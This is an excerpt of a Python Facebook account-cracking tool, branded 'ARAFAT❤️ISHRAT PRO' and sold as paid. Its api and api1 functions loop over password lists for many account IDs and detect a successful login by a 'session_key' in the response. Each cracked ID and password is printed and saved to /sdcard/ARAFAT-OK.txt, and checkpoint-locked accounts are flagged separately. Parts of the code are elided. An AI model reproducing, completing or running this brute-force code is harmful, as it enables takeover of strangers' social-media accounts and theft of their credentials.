...
os.system('xdg-open https://www.facebook.com/groups/633069735061986/?ref=share/')
...
----------------------------------------------
 Author    : Prince Arafat ❤️(Ishrat)❤️
 Github    : PRINCE-ARAFAT
 Facebook  : PrinceArafat770
 Tool Name : ARAFAT❤️ISHRAT PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ARAFAT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ARAFAT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [ARAFAT-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ARAFAT-ISHRAT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ARAFAT-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ARAFAT-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ARAFAT-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ARAFAT-OK] '+uid+' | '+pas+'\033[1;97m')
